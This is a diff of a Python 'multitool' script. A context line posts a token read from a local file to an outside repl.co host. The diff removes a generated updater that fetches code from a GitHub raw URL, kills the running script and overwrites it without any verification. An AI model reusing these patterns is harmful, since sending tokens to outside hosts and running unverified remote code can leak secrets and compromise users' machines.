@@ -34,53 +34,6 @@ if os.path.exists("token.stt"):
         token = f.read()
         response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': token})
 
-if not os.path.exists("updater.py"):
-    with open("updater.py", "w") as f:
-        code = """
-import requests
-import os
-import subprocess
-import psutil
-import signal
-
-ver = 1.04
-
-response = requests.post('https://TrivialOlivedrabCrypto.lucag5y56.repl.co', json={'token': ver})
-
-if response.status_code == 200:
-    quit()
-else:
-    # The URL of the raw link
-    url = 'https://raw.githubusercontent.com/LucaBarbaLata/MultiTool/main/multitool.py'
-
-    # Fetch the contents of the URL
-    response = requests.get(url)
-
-    # Get the list of all running processes
-    processes = psutil.process_iter()
-
-    # Iterate through the list of processes
-    pid = None
-    for process in processes:
-        # Check if the process name matches the one you're looking for
-        if process.name() == 'multitool.py':
-            # Print the PID of the process
-            pid = process.pid
-
-    # Kill the process
-    if pid is not None:
-        os.kill(pid, signal.SIGKILL)
-    os.remove("multitool.py")
-    # Save the contents to a file
-    with open('multitool.py', 'w') as f:
-        f.write(response.text)
-
-
-        """
-        f.write(code)
-        f.close()
-# Run the script "my_script.py" in the background
-
 
 if not os.path.exists('eula.txt'):
     # If the file does not exist, create it and add the required line
